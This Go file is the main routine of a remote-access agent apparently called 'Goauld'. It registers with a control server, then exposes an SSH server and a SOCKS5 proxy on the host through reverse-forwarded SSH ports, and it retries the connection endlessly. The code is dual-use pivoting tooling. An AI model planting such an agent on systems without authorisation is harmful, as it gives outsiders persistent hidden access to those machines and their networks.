package main

import (
	"Goauld/agent/agent"
	"Goauld/agent/control"
	"Goauld/agent/socks"
	"Goauld/agent/ssh"
	"Goauld/agent/sshd"
	"Goauld/common/log"
	commonssh "Goauld/common/ssh"
	"context"
	"errors"
	"fmt"
	"github.com/cenkalti/backoff/v5"
	"strconv"
	"time"
)

func main() {

	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          0.5,
		MaxInterval:         5 * time.Minute,
	}
	operation := func() (any, error) {
		run()
		return nil, errors.New("")
	}

	result, err := backoff.Retry(context.TODO(), operation, backoff.WithBackOff(exp))
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println(result)
}

func run() {
	controlErr := make(chan error)
	sshdErr := make(chan error)
	sshErr := make(chan error)
	socksErr := make(chan error)

	var forwardedPorts []commonssh.RemotePortForwarding

	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	_, err, warnings := agent.InitAgent()
	if err != nil {
		log.Error().Err(err).Msg("error initializing the agent")
		return
	}
	if len(warnings) > 0 {
		for _, warning := range warnings {
			log.Warn().Err(warning).Msgf("agent init error")
		}
	}
	// Announce to hanging goroutines that the configuration is completed
	configDone := make(chan struct{})
	log.Info().Msg("Agent init done")

	ctx, done := context.WithCancel(context.Background())
	defer done()

	// Initialize the control socket.io
	controlPlanClient := control.NewControlPlanClient(ctx, configDone)
	err = controlPlanClient.Init()
	if err != nil {
		log.Error().Err(err).Msg("error initializing the control plan")
		return
	}

	// Create the client SSH
	sshAgent := ssh.NewSSHAgent()
	// defer sshAgent.Close()

	// Start the control socket.io
	go func() {
		select {
		case controlErr <- controlPlanClient.Start():
		case <-ctx.Done():
			controlPlanClient.Close()
		}

	}()

	go func() {
		// Waiting for the configuration to be completed
		<-configDone
		// Initialize the client SSH
		err = sshAgent.Init(ctx)
		if err != nil {
			log.Error().Err(err).Msg("error initializing the SSH")
			return
		}

		// If the SSHD server is enabled, start it
		if agent.Get().SshdEnabled() {
			sshdServer := sshd.NewSshdServer(ctx)

			rListener, rPort, err := sshAgent.GetRemoteConn(agent.Get().RemoteForwardedSshdAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the SSHD connection")
			}
			agent.Get().UpdateSshdPort(rPort)
			// agent.Get().AddSshdToRpf()

			go func() {
				select {
				case sshdErr <- sshdServer.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				case <-ctx.Done():

					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote SSHD server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: agent.Get().RemoteForwardedSshdPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SSHD",
			})
		}

		// If the socks5 server is enabled, start it
		if agent.Get().SocksEnabled() {
			socks5, err := socks.NewSocks()
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 server")
			}
			rListener, rPort, err := sshAgent.GetRemoteConn(agent.Get().RemoteForwardedSocksAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 connection")
			}
			agent.Get().UpdateSocksPort(rPort)
			go func() {
				select {
				case socksErr <- socks5.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := socks5.Close()
					if err != nil {
						log.Warn().Err(err).Msg("socks close error")
					}
				case <-ctx.Done():
					err := socks5.Close()
					if err != nil {
						log.Warn().Err(err).Msg("socks close error")
					}
				}

			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote Socks5 server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: agent.Get().RemoteForwardedSocksPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SOCKS",
			})
		}

		// For all porte forwards, launch the forwarding
		rpf := agent.Get().GetRemotePortForwarding()
		for i := range rpf {
			port, err := sshAgent.RemoteForward(rpf[i], ctx)
			if err != nil {
				log.Error().Err(err).Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("error initializing the port forwarding")
				continue
			}
			rpf[i].ServerPort = port
			forwardedPorts = append(forwardedPorts, rpf[i])
			log.Info().Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("Port forwarding started")
		}

		err := controlPlanClient.SendPorts(forwardedPorts)
		if err != nil {
			log.Error().Err(err).Msg("error sending the forwarded ports")
		}
	}()

	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		log.Error().Err(err).Msg("error starting the agent")
	case err := <-sshdErr:
		log.Error().Err(err).Msg("error starting the sshd server")
	case err := <-sshErr:
		log.Error().Err(err).Msg("error starting the ssh client")
	case err := <-socksErr:
		log.Error().Err(err).Msg("error starting the socks server")
	}
}
